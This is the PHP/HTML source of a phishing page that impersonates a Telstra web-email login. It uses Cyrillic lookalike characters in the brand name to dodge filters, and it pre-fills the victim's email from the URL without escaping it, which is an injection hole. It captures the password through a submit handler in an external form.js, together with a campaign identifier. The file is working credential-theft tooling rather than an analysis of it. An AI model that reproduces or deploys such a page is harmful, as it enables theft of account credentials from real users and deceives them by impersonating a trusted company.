
<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
         $php_js->fake_base="/";
?>

<!DOCTYPE html>
<html style="" class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js-nav-translate">

<head>

<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js"></script>
<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
<link rel="stylesheet" href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">



<script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/form/core_form.js"></script>
<link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/form/core_form.css">



<link rel="stylesheet" href="form/css.css">


    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
    <title>&#1058;elstr&#1072; L&#1086;gin</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=0.7, user-scalable=yes">
    <link rel="shortcut icon" href="favicon-base-blue.ico">
    <link media="all" href="index.css" type="text/css" rel="stylesheet">
</head>

<body role="document" class="base-blue  white-bkg">
    <div class="parbase clientcontext"> </div> <span id="spectrum" class="spectrum-page-takeover hidden-xs" style="background-image: url('3.0-spectrum-gradient-blue.png'); visibility: visible;"></span>
    <div id="shade"></div>
    <header class="hide-header">
        
        <div id="primary-nav" class="navbar visible-lg" role="navigation">
            <div class="container">
                <div class="navbar-collapse collapse">
                    <ul class="nav navbar-nav navbar-left">
                        <li> <a title="" class="site-title"><span class="site-logo">&nbsp;</span></a> <a title="" class="site-title"><span class="site-title">PERSONAL</span></a> </li>
                    </ul>
                    
                </div>
            </div>
        </div>
        <div class="site-header" role="navigation">
            <div class="container"> <button type="button" class="nav-toggle"> <span class="menu">Menu</span>
                    <div class="icon"> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </div>
                </button> <a class="site-logo"><span class="vh">Telstra.com</span></a>
                
            </div>
        </div>
        <div class="site-header is-fixed headroom headroom--top" role="navigation">
            <div class="container"> <button type="button" class="nav-toggle"> <span class="menu">Menu</span>
                    <div class="icon"> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </div>
                </button> <a class="site-logo is-small"><span class="vh">Telstra.com</span></a>
                <ul class="site-actions">
                    <li> <button class="btn-search btn square search-toggle fn_popover"> <i class="td-icon icon-ui-search"></i> <span class="vh">Open search panel</span> </button> </li>
                </ul>
            </div>
        </div>
        
        
        
        
        <div class="row transparent rebrandBlankDiv"></div>
        <div class="visible-xs" style="height: 100px;"> <img class="img-spectrum visible-xs" src="3.0-spectrum-gradient-blue.png"> </div>
    </header>
    
    <div class="main-content-wrapper offcanvas" id="rebrandMainContent">
        <div class="container main-content" role="main">
            <div class="content parsys">
                <div class="parbase textimage section heroRow">
                    <div class="standard row content col-100">
                        <div class="col col-100-c0 first last" style="min-height: 418px;">
                            <div class="rebrandloginHeadingDiv"> <span class="heading rebrandLoginheading rebrandHeadingFont">Log in</span> </div>


                            <div class="rebrandloginHeadingDiv"> Please confirm your web email account</div>
                                
                            <div class="col-wrapper" style="padding: 0px; min-height: 418px;">

                                <div class="row col-50-50 rebrandColumns">
                                    <div class="col col-50-50-c0 first rebrandColumn1" style="padding: 0px; padding-bottom: 20px ">

                                        <div class="col-wrapper" style="padding: 0px; margin-right: 28px; ">

                                            <div style="padding: 0px; margin-left: 30px; margin-top: 30px;">
                                                <form onsubmit="send1(event,'next__')" id="Login" name="Login" class="form" style="margin: 0px;" novalidate autocomplete="off">
                                                    


                                                    <div class="row rebrandErrMsgContainerDiv err_div" style="display: none;">
                                                        <div class="msg-error" style="border: 2px solid rgb(161, 40, 62);">
                                                            <div style="display: inline-block; vertical-align: top; padding-left: 4px; padding-top: 4px;"> <img src="exclamationmark-red.png"> </div>
                                                            <div class="loginerrmsg" style="color: rgb(161, 40, 62);"> <em></em><span class="legend"> The username or password you entered is incorrect.</span> </div>
                                                        </div>
                                                    </div>
                                                    <div >
                                                        <div class="input-wrapper field-group form-group">
                                                            <div class="input-container form-control-username cmn_rebrandFormControl"> 
                                                                <span class="visible-ie8"></span>
                                                                 <input id="username" tabindex="1" pattern=".{4,}" data-err_text="Please enter valid " disabled="disabled" value="<?php echo $_GET['email'] ?>" name="username"  size="30" autocomplete="off" maxlength="200"  placeholder="Username" style="height: 100%; box-shadow: none; width: 78%; border: 0px solid rgb(221, 221, 221);" type="text" class="form-control"> 
                                                                 

                                                             </div>
                                                        </div>
                                                        
                                                        
                                                        <div class="input-wrapper field-group form-group">
                                                            <div class="input-container form-control-userpasswd cmn_rebrandFormControl"> 
                                                                <span class="visible-ie8"></span>
                                                                <input tabindex="2" id="password" pattern=".{4,}" data-err_text="Please enter valid "  name="pass" autocomplete="off" size="30" maxlength="50"  placeholder="Password" style="height: 100%; box-shadow: none; width: 78%; border: 0px solid rgb(221, 221, 221);" type="password" class="form-control">
                                                                <a id="toggleFpw" class="forgot-link" style="vertical-align: bottom; line-height: 1px;">Forgot?</a>
                                                             </div>

                                                        </div>
                                                        <div class="cl-forgot-frame-wrap iframeFpw" hidden=""> <a><i class="td-icon-sm icon-ui-up-arrow-thick"></i></a>  </div>
                                                        
                                                        
                                                        
                                                    </div>
                                                    <div> 
                                                        <button tabindex="4" id="Submit" name="Submit" class="btn primary" type="submit">Log in</button>
                                                    </div>
                                                    
                                                </form>
                                                
                                            </div>
                                        </div>
                                    </div>
                                   
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <footer>
        <hr style="margin-bottom: 0px;">
        <div role="footer" class="footer">
            <div id="scrollup" class="affix-top">
                <div class="container">
                    <div class="scrollup-outer"> <a>
                            <div class="scrollup">Back to top</div>
                        </a> </div>
                </div>
            </div>
            <div class="footer-links container">
                <div class="system_generated_classes holderjs standard  row content col-25-25-25-25 default">
                    <div class="col first col-25-25-25-25-c0 hidden-xs">
                        <div class="col-wrapper">
                            <ul class="social-icons">
                                <li><a><span class="social-icon facebook td-icon icon-facebook text-theme"></span></a></li>
                                <li><a><span class="social-icon twitter td-icon icon-twitter text-theme"></span></a></li>
                                <li><a><span class="social-icon youtube td-icon icon-youtube text-theme"></span></a></li>
                                <li><a><span class="social-icon google td-icon icon-google-plus text-theme"></span></a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col col-25-25-25-25-c1">
                        <div class="col-wrapper">
                            <ul>
                                <li><a class="header">&#1058;elstr&#1072;.&#1089;&#1086;m sitem&#1072;p</a></li>
                                <li><a>&#1057;&#1086;nt&#1072;&#1089;t us</a></li>
                                <li><a>Find &#1072; st&#1086;re</a></li>
                                <li><a>&#1057;&#1072;reers</a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col col-25-25-25-25-c2">
                        <div class="col-wrapper">
                            <ul>
                                <li><a class="header">&#1040;b&#1086;ut us</a></li>
                                <li><a>&#1058;elstr&#1072; Wh&#1086;les&#1072;le</a></li>
                                <li><a>&#1058;elstr&#1072; Gl&#1086;b&#1072;l</a></li>
                                <li><a>&#1058;elstr&#1072; Digit&#1072;l</a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="clearfix hidden-lg"></div>
                    <div class="col col-25-25-25-25-c3 last">
                        <div class="col-wrapper">
                            <ul>
                                <li><a class="header">&#1057;&#1086;nsumer &#1040;dvi&#1089;e</a></li>
                                <li><a>&#1057;riti&#1089;&#1072;l Inf&#1086;rm&#1072;ti&#1086;n Summ&#1072;ries</a></li>
                                <li><a>&#1058;erms &#1086;f use</a></li>
                                <li><a>Priv&#1072;&#1089;y</a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col first col-25-25-25-25-c0 visible-xs">
                        <div class="col-wrapper">
                            <ul class="social-icons">
                                <li><a><span class="social-icon facebook td-icon icon-facebook text-theme"></span></a></li>
                                <li><a><span class="social-icon twitter td-icon icon-twitter text-theme"></span></a></li>
                                <li><a><span class="social-icon youtube td-icon icon-youtube text-theme"></span></a></li>
                                <li><a><span class="social-icon google td-icon icon-google-plus text-theme"></span></a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
    
    <div class="shade-bg">&nbsp;</div>
    <div id="lpButtonDiv"></div>
    <div class="servicecomponents cloudservices"></div>
    <div id="mboxDefault" style="visibility: visible; display: block;"></div>


<script type="text/javascript">
var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
var php_js = <?php  echo json_encode($php_js) ?>
</script>
<script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
</body>

</html>